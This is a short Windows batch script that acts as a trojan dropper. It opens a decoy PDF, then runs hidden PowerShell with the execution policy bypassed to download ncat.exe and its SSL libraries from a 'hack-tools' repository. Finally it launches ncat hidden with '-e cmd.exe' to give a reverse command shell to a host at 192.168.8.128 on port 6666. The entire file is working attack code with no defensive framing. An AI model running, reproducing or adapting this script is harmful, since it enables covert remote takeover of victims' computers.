@echo off
.\file.pdf

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "curl 'https://raw.githubusercontent.com/h4shell/hack-tools/refs/heads/main/windows_troyan/ncat.exe' -OutFile 'ncat.exe'"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "curl 'https://raw.githubusercontent.com/h4shell/hack-tools/refs/heads/main/windows_troyan/ssleay32.dll' -OutFile 'ssleay32.dll'"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "curl 'https://raw.githubusercontent.com/h4shell/hack-tools/refs/heads/main/windows_troyan/libeay32.dll' -OutFile 'libeay32.dll'"

timeout /t 3 /nobreak

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '.\ncat.exe' -ArgumentList '192.168.8.128 6666 -e cmd.exe' -WindowStyle Hidden"
